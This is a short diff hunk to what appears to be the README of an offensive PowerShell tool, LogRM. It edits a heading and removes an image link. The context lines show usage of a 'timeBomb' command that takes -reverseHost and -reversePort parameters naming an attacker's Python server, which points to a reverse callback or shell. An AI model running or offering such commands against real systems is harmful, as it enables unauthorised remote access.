@@ -117,9 +117,9 @@ PS> timeBomb -task now -newest <give a big number> -reverseHost <Python server i
 PS> timeBomb -task now -ip 127.0.0.1 -newest <give a big number> -reverseHost <Python server ip> -reversePort <Python server port>
 ```
 
-#### Example 1 - User is logged on
+#### Example 1 - User is logged of
 
-![alt text](https://github.com/tasox/LogRM/blob/master/Use_is_LoggedOn.png)
+![alt text]()
 
 
 #### Example 2 - User is logged of
